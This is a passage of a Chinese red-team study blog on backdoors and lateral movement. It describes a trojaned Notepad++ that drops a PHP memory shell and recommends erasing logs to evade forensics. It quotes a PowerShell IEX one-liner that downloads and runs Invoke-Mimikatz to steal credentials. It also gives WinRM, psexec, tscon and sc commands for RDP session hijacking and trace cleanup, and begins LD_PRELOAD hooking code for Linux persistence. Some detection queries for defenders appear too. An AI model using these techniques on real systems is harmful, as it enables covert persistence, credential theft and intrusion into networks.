<p>Demo 环境：windows 7 x64，notepad++(x64)</p>
<p>Demo IDE：vs2017</p>
<p>在源码中，我们依然修改每次打开以php结尾的文件，先触发后门，在打开文件。其他文件跳过触发后门。但是这次代码中加入了生成micropoor.txt功能。并且使用php来加载运行它，是的，生成一个txt。demo中，为了更好的演示，取消自动php加载运行该txt。</p>
<p>而txt的内容如图所示，并且为了更好的了解，开启文件监控。<br>
<img src="https://img-blog.csdnimg.cn/20201005111301605.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
使用notepad++(demo2).exe 打开以php结尾的demo.php，来触发microdoor。并且生成了micropoor.txt<img src="https://img-blog.csdnimg.cn/20201005111312836.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201005111317613.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
而micropoor.txt内容：<br>
<img src="https://img-blog.csdnimg.cn/20201005111329181.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
配合micropoor.txt的内容，这次的Demo将会变得更有趣。</p>
<p><strong>那么这次demo 做到了，无服务，无进程，无端口，无自启。</strong></p>
<p><strong>加入到demo中，增加对手成本。使其更隐蔽。</strong></p>
<p>如果demo不是notepad++，而是mysql呢?用它的端口，它的进程，它的服务，它的一切，来重新编译microdoor。</p>
<p>例如：重新编译mysql.so,mysql.dll，替换目标主机。</p>
<p>无文件，无进程，无端口，无服务，无语言码。因为一切附属于它。</p>
<p>这应该是一个攻击者值得思考的问题。</p>
<p><strong>正如第一季所说：在后门的进化中，rootkit也发生了变化，最大的改变是它的系统层次结构发生了变化。</strong></p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>cloud<span class="token punctuation">.</span>tencent<span class="token punctuation">.</span>com<span class="token operator">/</span>developer<span class="token operator">/</span>article<span class="token operator">/</span><span class="token number">1497361</span>
</code></pre>
<hr>
<h2><a id="723_APT_5422"></a>7.2.3 APT对抗（三）红蓝对抗关于后门对抗</h2>
<p><strong>前者的话:</strong> 从第三季开始引入段子，让本枯燥的学术文章，也变得生动有趣。第二季的Demo遵循人性五条来设计，回忆这其中五条：</p>
<p><strong>1、攻击方与防御方的本质是什么?</strong></p>
<p>增加对方的时间成本，人力成本，资源成本（不限制于服务器资源），金钱成本。</p>
<p><strong>2、安全公司的本质是什么?</strong></p>
<p>盈利、最小投入、最大产出</p>
<p><strong>3、安全公司产品的本质是什么?</strong></p>
<p>能适应大部分客户，适应市场化，并且适应大部分机器。（包括不限制于资源紧张,宽带不足等问题的客户）</p>
<p><strong>4、安全人员的本质是什么?</strong></p>
<p>赚钱，养家。买房，还房贷。导致，快速解决客户问题（无论暂时还是永久性解决），以免投诉。</p>
<p><strong>5、对接客户的本质是什么?</strong></p>
<p>对接客户也是某公司内安全工作的一员、与概念4相同。</p>
<p><strong>6、线索排查与反线索排查</strong></p>
<p>那么这个demo离可高级可持续性渗透后门还有一段距离，这里引入第六条<code>线索排查</code>与<code>反线索排查</code>,在第二季的dem中，它生成了一个名为 micropoor.的文件，如果经验丰富的安全人员可根据时间差来排查日记，demo的工作流程大致是这样的，打开 notepad++，生成 micropoor. txt，写入内容，关闭文件流。根据线索排查，定位到 notepad++，导致权限失控。</p>
<p>在线索排查概念中，这里要引入“ABC”类线索关联排查，当防御者在得到线索A，顺藤到B，最后排查到目标文件C，根据五条中的第一条，demo要考虑如何删除指定日志内容，以及其他操作。来阻止ABC类线索关联排查。</p>
<p><strong>不要思维固死在这是一个 notepad++后门的文章，它是一个面向类后门，面向的是可掌握源码编译的类后门。</strong></p>
<p>同样不要把思维固定死在demo中的例子，针对不同版本的NT系统，完全引用"powershell IEX(New-Object System.Net.WebClient).DownloadString(‘https://raw.githubusercontent.com/clymb3r/Powershell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1’);Invoke-Mimikatz"而关于bypass UAC，已经有成熟的源码。或发送至远程或是写在本地的图片里，不要让知识限制了后门的想象。这也正是第一季所说的：一个优秀的 Microdot是量身目标制定且一般不具备通用性的。一般不具备通用性。</p>
<p>观看目前文章的一共有2类人，一类攻击方，一类防守方。假设一个场景，现在摆在你面前有一台笔记本，并且这台笔记本有明确的后门，你的任务，排查后门。我想所有人都会排查注册表，服务，端口，进程等。因为这些具备通用性，也同样具备通用性排查手段。</p>
<p>临近文章结尾，第三次引用：在后门的进化对抗中，rootkit发生了变化，最大的改变是它的系统层次结构发生了变化。</p>
<hr>
<h2><a id="724_APT_5460"></a>7.2.4 APT对抗（四）红蓝对抗关于后门对抗</h2>
<p>第四季是一个过渡季，过渡后门在对抗升级中由传统后门，衍生成锁定目标的制定后门。</p>
<p>引用百度百科的“后门程序"的相关解释 ：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>baike<span class="token punctuation">.</span>baidu<span class="token punctuation">.</span>com<span class="token operator">/</span>item<span class="token operator">/</span><span class="token operator">%</span>E5<span class="token operator">%</span><span class="token number">90</span><span class="token operator">%</span><span class="token number">8</span>E<span class="token operator">%</span>E9<span class="token operator">%</span><span class="token number">97</span><span class="token operator">%</span>A8<span class="token operator">%</span>E7<span class="token operator">%</span>A8<span class="token operator">%</span><span class="token number">8</span>B<span class="token operator">%</span>E5<span class="token operator">%</span>BA<span class="token operator">%</span><span class="token number">8F</span><span class="token operator">/</span><span class="token number">108154</span>
</code></pre>
<p>安全从业人员，其实至少一直在与传统后门对抗，比如最常见的webshell免杀与webshell过waf。应急中的样本取证查杀远控残留文件等。但是webshell，远控仅仅又是“backdoor”的其中一种。</p>
<p>这里按照上几季的风格继续引用几个概念，只有概念清晰，才能了解如何对抗。</p>
<p><strong>1：安全从业人员为什么要了解后门？</strong></p>
<p>防御是以市场为核心的，而不是以项目为核心。需要对抗的可能是黑产从业者的流量劫持相关后门，或者是政治黑客的高持续渗透权限把控后门等。</p>
<p><strong>2：攻击人员为什么要了解后门？</strong></p>
<p>随着对抗传统后门的产品越来越成熟，由特征查杀，到行为查杀，到态势感知。到大数据联合特征溯源锁定，如何反追踪，是一个非常值得思考的问题。</p>
<p><strong>3：后门与项目的关联是什么？</strong></p>
<p>某项目，被入侵，应急并加固解决，若干天后，再次被入侵依然篡改为某博彩。导致安全从业人员，客户之间的问题。</p>
<p><strong>4：后门与安全产品的关联是什么？</strong></p>
<p>某客户购买某安全产品套装，在实战中，一般由非重点关注服务器迂回渗透到核心服务器来跨过安全产品监控，得到相关权限后，后门起到越过安全产品。它会涉及对其他附属安全产品的影响。如客户质疑：为什么我都买了你们的套装，还被入侵。并且这还是第二次了。</p>
<p><strong>这里再一次引入百度百科的APT的主要特性：</strong></p>
<p>——潜伏性： 这些新型的攻击和威胁可能在用户环境中存在一年以上或更久，他们不断收集各种信息，直到收集到重要情报。而这些发动APT攻击的黑客目的往往不是为了在短时间内获利，而是把“被控主机”当成跳板，持续搜索，直到能彻底掌握所针对的目标人、事、物，所以这种APT攻击模式, 实质上是一种“恶意商业间谍威胁”。</p>
<p>——持续性： 由于APT攻击具有持续性甚至长达数年的特征，这让企业的管理人员无从察觉。在此期间，这种“持续性”体现在攻击者不断尝试的各种攻击手段，以及渗透到网络内部后长期蛰伏。</p>
<p>——锁定特定目标： 针对特定政府或企业，长期进行有计划性、组织性的窃取情报行为,针对被锁定对象寄送几可乱真的社交工程恶意邮件，如冒充客户的来信,取得在计算机植入恶意软件的第一个机会。</p>
<p>——安装远程控制工具： 攻击者建立一个类似僵尸网络Botnet的远程控制架构，攻击者会定期传送有潜在价值文件的副本给命令和控制服务器(C&amp;C Server)审查。将过滤后的敏感机密数据，利用加密的方式外传。</p>
<p><strong>一次针对特定对象，长期、有计划性渗透的本质是什么？</strong></p>
<p>窃取数据下载到本地，或者以此次渗透来达到变现目的。</p>
<p>一次具有针对性的渗透，绝对不单单是以渗透DMZ区为主，重要资料一般在内网服务器区（包括但不限制于数据库服务器，文件服务器，OA服务器），与内网办公区（包括但不限制于个人机，开发机，财务区）等。而往往这样的高级持续渗透，不能是一气呵成，需要一定时间内，来渗透到资料所在区域。而这里其中一个重要的环节就是对后门的要求 ，在渗透期间内（包括但不限制于一周到月甚至到年）以保持后续渗透。</p>
<p><strong>传统型的后门不在满足攻击者的需求，而传统型的木马后门， 大致可分为六代：</strong></p>
<p>第一代 ，是最原始的木马程序。主要是简单的密码窃取，通过电子邮件发送信息等，具备了木马最基本的功能。</p>
<p>第二代 ，在技术上有了很大的进步，冰河是中国木马的典型代表之一。</p>
<p>第三代 ，主要改进在数据传递技术方面，出现了ICMP等类型的木马，利用畸形报文传递数据，增加了杀毒软件查杀识别的难度。</p>
<p>第四代 ， 在进程隐藏方面有了很大改动，采用了内核插入式的嵌入方式，利用远程插入线程技术，嵌入DLL线程。或者挂接PSAPI，实现木马程序的隐藏，甚至在Windows NT/2000下，都达到了良好的隐藏效果。灰鸽子和蜜蜂大盗是比较出名的DLL木马。</p>
<p>第五代 ，驱动级木马。驱动级木马多数都使用了大量的Rootkit技术来达到在深度隐藏的效果，并深入到内核空间的，感染后针对杀毒软件和网络防火墙进行攻击，可将系统SSDT初始化，导致杀毒防火墙失去效应。有的驱动级木马可驻留BIOS，并且很难查杀。</p>
<p>第六代 ，随着身份认证UsbKey和杀毒软件主动防御的兴起，黏虫技术类型和特殊反显技术类型木马逐渐开始系统化。前者主要以盗取和篡改用户敏感信息为主，后者以动态口令和硬证书攻击为主。PassCopy和暗黑蜘蛛侠是这类木马的代表。</p>
<p>以远控举例，远控最开始生成的RAT功能一体化（包括但不限制于文件传输，命令执行等），后衍生成生成RAT支持插件式来达到最终目的。</p>
<p>以上的几代包括以上远控共同点，以独立服务或者独立进程，独立端口等来到达目的。难以对抗目前的反病毒反后门程序。那么传统型后门权限维持就不能满足目前的需求。</p>
<p>以第二季的demo举例，它无自己的进程，端口，服务，而是借助notepad++（非dll劫持）来生成php内存shell（这个过程相当于插件生成），并且无自启，当服务器重启后，继续等待管理员使用notepad++，它属于一个AB链后门，由A-notepad生成B-shell，以B-shell去完成其他工作。如果继续改进Demo，改造ABC链后门，A负责生成，B负责清理痕迹，C负责工作呢? 这是一个攻击者应该思考的问题。</p>
<p><strong>而后门的主要工作有2点 ：</strong></p>
<pre><code class="prism language-c"><span class="token number">1</span>、越过安全产品

<span class="token number">2</span>、维持持续渗透权限
</code></pre>
<p>文章的结尾，这不是一个notepad++的后门介绍，它是一个demo，一个类后门 ，一个具有源码可控类的后门</p>
<hr>
<h2><a id="725_dlldayuTwentieth_Day_5561"></a>7.2.5 dll劫持（dayu-Twentieth Day）</h2>
<p>书上介绍了-两种劫持方法剖析，目前没找到实例，书上讲得很好…</p>
<p>另外的dll劫持：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>cnblogs<span class="token punctuation">.</span>com<span class="token operator">/</span>h2zZhou<span class="token operator">/</span>p<span class="token operator">/</span><span class="token number">8601375.</span>html

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span><span class="token number">4</span>hou<span class="token punctuation">.</span>com<span class="token operator">/</span>posts<span class="token operator">/</span>PrJ4

https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span>system<span class="token operator">/</span><span class="token number">227824.</span>html
</code></pre>
<hr>
<h2><a id="726_APT_5575"></a>7.2.6 APT对抗-红蓝对抗关于后门对抗（五~七）</h2>
<p>这里5~7属于内部资料，我这里就不共享了！！！</p>
<hr>
<h2><a id="727_ATTCK_5579"></a>7.2.7 ATT&amp;CK攻防初窥系列–横向移动篇</h2>
<p>之前的文章介绍了ATT&amp;CK执行篇中Control和XSL的用法。在网络攻防中，执行往往发生在进入入口后的初始阶段，而横向移动则发生在中间阶段。横向移动的目的是根据已有条件扩大攻击成果。下面我们将会像大家展示ATT&amp;CK中罗列的横向移动手法的运用和检测。</p>
<p><strong>T1028-Windows Remote Management</strong></p>
<p>在介绍Windows Remote Management(Winrm)之前，首先要介绍WS-Management（Web服务器管理协议）。WS-Management协议是一种基于SOAP协议的DMTF开放标准，用于对服务器等网络设备进行管理。WinRM是windows对于该协议的一种实现。</p>
<p><strong>根据微软官方文档介绍:</strong></p>
<p>1、WinRM服务将在Windows Server 2008上自动启动。在Windows Vista上，该服务必须手动启动。</p>
<p>2、默认情况下，未配置WinRM 侦听器。即使WinRM服务正在运行，也无法接收或发送请求数据的WS-Management协议消息。</p>
<p>3、Internet连接防火墙（ICF）阻止访问端口。</p>
<p>通过administrator权限使用下面命令可以打开上述限制条件，开启winrm服务并监听端口</p>
<pre><code class="prism language-c">winrm quickconfig
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006200730831.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<code>winrm e winrm/config/listener</code>  #查看监听情况<br>
<img src="https://img-blog.csdnimg.cn/2020100620080295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
可以看到现在winrm开启了5985进行监听并使用HTTP协议进行传输，而ListeningOn字段则是监听的ip地址(都是自身ip地址)。</p>
<p>配置好服务端之后如果我们尝试通过客户端连接服务端进行远程代码执行的时候会出现如下报错<br>
<img src="https://img-blog.csdnimg.cn/20201006200822644.png#pic_center" alt="在这里插入图片描述"><br>
原因是winrm客户端维护这一个信任主机列表只有在信任主机列表中的服务端才允许连接。</p>
<pre><code class="prism language-c">winrm set winrm<span class="token operator">/</span>config<span class="token operator">/</span>client @<span class="token punctuation">{</span>TrustedHosts<span class="token operator">=</span><span class="token string">"*"</span><span class="token punctuation">}</span>
</code></pre>
<p>测试远程服务器是否开启winrm</p>
<pre><code class="prism language-c">Test<span class="token operator">-</span>WsMan <span class="token number">10.50</span><span class="token number">.1</span><span class="token number">.208</span>                            #在powershell中执行
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006200850820.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>技术复现</strong></p>
<p>横向移动(winrs)</p>
<pre><code class="prism language-c">winrs <span class="token operator">-</span>r<span class="token punctuation">:</span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.50</span><span class="token number">.1</span><span class="token number">.208</span><span class="token punctuation">:</span><span class="token number">5985</span> <span class="token operator">-</span>u<span class="token punctuation">:</span>administrator <span class="token operator">-</span>p<span class="token punctuation">:</span>xxxxxxxx ipconfig
</code></pre>
<p><strong>横向移动(Invoke-Command)</strong></p>
<pre><code class="prism language-c">Invoke<span class="token operator">-</span>Command <span class="token operator">-</span>ComputerName <span class="token number">10.50</span><span class="token number">.1</span><span class="token number">.208</span> <span class="token operator">-</span>ScriptBlock <span class="token punctuation">{</span>ipconfig<span class="token punctuation">}</span> <span class="token operator">-</span>credential administrator          #ComputerName后可以跟ip或者计算机名
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/202010062016178.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
验证成功后输出ipconfig命令内容<br>
<img src="https://img-blog.csdnimg.cn/20201006201628407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
横向移动(Enter-PSSession)</p>
<pre><code class="prism language-c">Enter<span class="token operator">-</span>PSSession <span class="token operator">-</span>ComputerName <span class="token number">10.50</span><span class="token number">.1</span><span class="token number">.208</span> <span class="token operator">-</span>Credential administrator
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006201703279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
验证成功后弹回远程主机的powershell<br>
<img src="https://img-blog.csdnimg.cn/20201006201715561.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>威胁检测</strong></p>
<p>数据源:文件监视，身份验证日志，网络连接监视，进程监视，进程命令行参数</p>
<p><strong>WINRM流量特征</strong></p>
<p>通过对winrs、Enter-PSSession、Invoke-Command通信流量抓包发现其通信特征相同，都是通过请求http://xxx.xxx.xxx.xxx/wsman 来进行验证和下发命令。并且即使WinRM是使用http通信的但是其通信内容也是加密的，加密的protocal为"application/HTTP-SPNNEG-session-encrypted"</p>
<pre><code class="prism language-c">User<span class="token operator">-</span>Agent contains <span class="token string">"Microsoft WinRM Client"</span> AND Content<span class="token operator">-</span>Type contains <span class="token string">"HTTP-SPNNEG-session-encrypted"</span> AND Content<span class="token operator">-</span>Type contains <span class="token string">"Encrypted Boundary"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006201748893.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>WINRM客户端</strong></p>
<p>#winrm客户端产生4656日志</p>
<pre><code class="prism language-c">eventNum<span class="token punctuation">:</span><span class="token number">4656</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006201810950.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<p><strong>网络特征:（级别：高）</strong></p>
<p>sysmon检测到powershell或者winrs.exe发起的网络连接信息</p>
<pre><code class="prism language-c">eventNum<span class="token punctuation">:</span><span class="token number">3</span> AND DestinationPort<span class="token punctuation">:</span><span class="token number">5985</span> AND <span class="token punctuation">(</span>Image contains<span class="token punctuation">:</span><span class="token string">"powershell.exe"</span> OR Image contains<span class="token punctuation">:</span><span class="token string">"winrs.exe"</span><span class="token punctuation">)</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006201834916.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201006201839535.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>进程特征:（级别：高）</strong></p>
<p>sysmon检测到到winrm.vbs的进程创建</p>
<pre><code class="prism language-c">eventNum<span class="token punctuation">:</span><span class="token number">1</span> AND CommandLine contains winrm<span class="token punctuation">.</span>vbs
</code></pre>
<p><strong>命令行参数特征:（级别：高）</strong></p>
<pre><code class="prism language-c">CommandLine contains <span class="token string">"Invoke-Command"</span> OR CommandLine contains <span class="token string">"Enter-PSSession"</span> OR Image contains <span class="token string">"winrs.exe"</span>
</code></pre>
<p><strong>WINRM服务端</strong></p>
<p>进程特征:（级别高）</p>
<p>在使用winrm执行远程命令时，目标机器会启动一个winrshost.exe来执行远程命令。</p>
<pre><code class="prism language-c">eventNUm<span class="token punctuation">:</span><span class="token number">1</span> AND ParentImage contains <span class="token string">"winrshost.exe"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006201931493.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>T1076 Remote Desktop Protocol</strong></p>
<p>远程桌面是操作系统中的常见功能。它允许用户使用远程系统上的系统桌面图形用户界面登录到交互式会话。Microsoft将其对远程桌面协议（RDP）的实现称为远程桌面服务（RDS）。</p>
<p>如果启用了服务并允许访问具有已知凭据的帐户，则攻击者可以通过RDP / RDS连接到远程系统以扩展访问权限。攻击者可能会使用凭据访问技术来获取与RDP一起使用的凭据。攻击者还可以结合使用RDP和可访问性功能技术来实现持久性。</p>
<p>攻击者还可能执行RDP会话劫持，其中涉及窃取合法用户的远程会话。通常情况下当其他人试图窃取其会话(可以理解为windows的快速切换用户功能)时会收到问题提示并要求出示密码。凭借系统权限(SYSTEM权限)的终端服务控制台c:\windows\system32\tscon.exe [session number to be stolen]，攻击者可以切换会话而无需输入密码。这可能导致攻击者窃取域管理员或更高特权的账户会话。</p>
<p><strong>技术复现</strong></p>
<p>前置条件：拥有某个本地管理员组账号的权限</p>
<p>目的：通过rdp会话劫持使我们可以从该管理员组账号切换到本机任意一个账户的rdp会话中</p>
<p>以一台域控制器(10.50.1.208)为例，我们获取了其本地管理员组一个用户(huahua)的凭据。<br>
<img src="https://img-blog.csdnimg.cn/20201006201957305.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201006202002900.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
<strong>横向移动(PSExec）</strong></p>
<pre><code class="prism language-c">psexec<span class="token punctuation">.</span>exe <span class="token operator">-</span>s cmd       #获取SYSTEM权限的shell
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006202019598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">query user          #查看当前存在的会话

tscon <span class="token number">2</span> <span class="token operator">/</span>dest<span class="token punctuation">:</span>rdp<span class="token operator">-</span>tcp#<span class="token number">0</span>              #<span class="token number">2</span>为administrator的会话id，rdp<span class="token operator">-</span>tcp#<span class="token number">0</span>为我们当前会话名
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006202037527.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
可以看到我们已经成功切换到了域管理员的会话中。</p>
<p><strong>横向移动(SC）</strong></p>
<p>原理为使用sc命令实现执行SYSTEM权限的命令</p>
<pre><code class="prism language-c">query user            #查看当前存在的会话
sc create huahua binPath<span class="token operator">=</span> <span class="token string">"tscon 2 /dest:rdp-tcp#0"</span>
sc start huahua
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006202055929.png#pic_center" alt="在这里插入图片描述"><br>
<img src="https://img-blog.csdnimg.cn/20201006202100506.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<pre><code class="prism language-c">sc delete huahua           #清除痕迹
</code></pre>
<p><strong>威胁检测</strong></p>
<p>进程特征</p>
<p>通过tscon.exe实现RDP劫持的前提为执行tscon.exe的用户权限为SYSTEM，可以通过检测新创建的tscon.exe进程的User是否为SYSTEM来判断是否发生了可疑的RDP劫持。</p>
<pre><code class="prism language-c">Image contains <span class="token string">"tscon.exe"</span> AND USER contains <span class="token string">"NT AUTHORITY\\SYSTEM"</span>
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/20201006202127745.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
当使用rdp会话劫持切换用户时安全日志会出现4778、4779两条安全日志<br>
<img src="https://img-blog.csdnimg.cn/20201006202138560.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM0ODAxNzQ1,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"><br>
参考文章：</p>
<pre><code class="prism language-c">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>freebuf<span class="token punctuation">.</span>com<span class="token operator">/</span>articles<span class="token operator">/</span>network<span class="token operator">/</span><span class="token number">221199.</span>html
</code></pre>
<hr>
<h2><a id="728_LinuxLD_PRELOAD_5761"></a>7.2.8 Linux权限维持之LD_PRELOAD</h2>
<p><strong>LD_PRELOAD</strong></p>
<p>Linux操作系统的动态链接库在加载过程中，动态链接器会先读取LD_PRELOAD环境变量和默认配置文件<code>/etc/ld.so.preload</code>，并将读取到的动态链接库文件进行预加载，即使程序不依赖这些动态链接库，LD_PRELOAD环境变量和<code>/etc/ld.so.preload</code>配置文件中指定的动态链接库依然会被装载,因为它们的优先级比LD_LIBRARY_PATH环境变量所定义的链接库查找路径的文件优先级要高，所以能够提前于用户调用的动态库载入。</p>
<p>通过LD_PRELOAD环境变量，能够轻易的加载一个动态链接库。通过这个动态库劫持系统API函数，每次调用都会执行植入的代码。</p>
<p><strong>dlsym</strong></p>
<p>dlsym是一个计算机函数，功能是根据动态链接库操作句柄与符号，返回符号对应的地址，不但可以获取函数地址，也可以获取变量地址。</p>
<p>dlsym定义在Linux操作系统中的dlfcn.h中，函数原型如下：</p>
<pre><code class="prism language-c"><span class="token keyword">void</span> <span class="token operator">*</span> <span class="token function">dlsym</span><span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span> handle<span class="token punctuation">,</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span> symbol<span class="token punctuation">)</span>
</code></pre>
<pre><code class="prism language-c">handle：由dlopen打开动态链接库后返回的指针；
symbol：要求获取的函数或全局变量的名称。
返回值：<span class="token keyword">void</span> <span class="token operator">*</span> 指向函数的地址，供调用使用。
</code></pre>
<p><strong>劫持示例代码：</strong></p>
<pre><code class="prism language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;dlfcn.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>

<span class="token keyword">int</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>message<span class="token punctuation">)</span> <span class="token punctuation">{</span>
  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>new_puts<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span>
  new_puts <span class="token operator">=</span> <span class="token function">dlsym</span><span class="token punctuation">(</span>RTLD_NEXT<span class="token punctuation">,</span> <span class="token string">"puts"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// do some thing …</span>
